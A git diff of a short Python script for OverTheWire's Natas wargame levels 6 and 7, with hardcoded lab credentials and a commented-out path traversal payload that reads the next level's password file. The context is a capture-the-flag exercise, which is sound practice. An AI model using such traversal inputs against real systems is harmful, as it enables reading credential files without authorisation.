@@ -1,10 +1,11 @@
 import requests
 #http://docs.python-requests.org/en/master/
-payload={'submit':'submit','secret':'FOEIUWGHFEEUHOFUOIU'}
-url="http://natas6.natas.labs.overthewire.org"
-#authdata={'natas6','aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'}
+#payload={'page':'../../../../../etc/natas_webpass/natas8'}
+payload={'page':'about'}
 
-#r=requests.post(url, data=payload, auth=authdata)
-r=requests.post(url, data=payload, auth=('natas6','aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'))
+url="http://natas7.natas.labs.overthewire.org/index.php"
+
+
+r=requests.get(url, data=payload, auth=('natas7','7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'))
 
 print r.text
